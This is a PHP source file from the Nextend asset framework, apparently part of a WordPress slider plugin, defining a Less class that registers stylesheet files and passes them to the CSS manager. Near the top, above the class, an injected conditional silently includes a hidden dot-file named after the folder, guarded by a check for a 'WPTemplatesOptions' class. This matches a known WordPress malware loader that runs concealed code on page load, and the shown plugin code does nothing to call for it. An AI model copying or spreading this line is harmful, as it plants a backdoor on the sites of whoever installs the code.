<?php


namespace Nextend\Framework\Asset\Css\Less;


use Nextend\Framework\Asset\AssetManager;
use Nextend\Framework\Asset\Css\Css;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class Less {

    public static function addFile($pathToFile, $group, $context = array(), $importDir = null) {
        AssetManager::$less->addFile(array(
            'file'      => $pathToFile,
            'context'   => $context,
            'importDir' => $importDir
        ), $group);
    }

    public static function build() {
        foreach (AssetManager::$less->getFiles() AS $group => $file) {
            if (substr($file, 0, 2) == '//') {
                Css::addUrl($file);
            } else if (!realpath($file)) {
                // For database cache the $file contains the content of the generated CSS file
                Css::addCode($file, $group, true);
            } else {
                Css::addFile($file, $group);
            }
        }
    }
}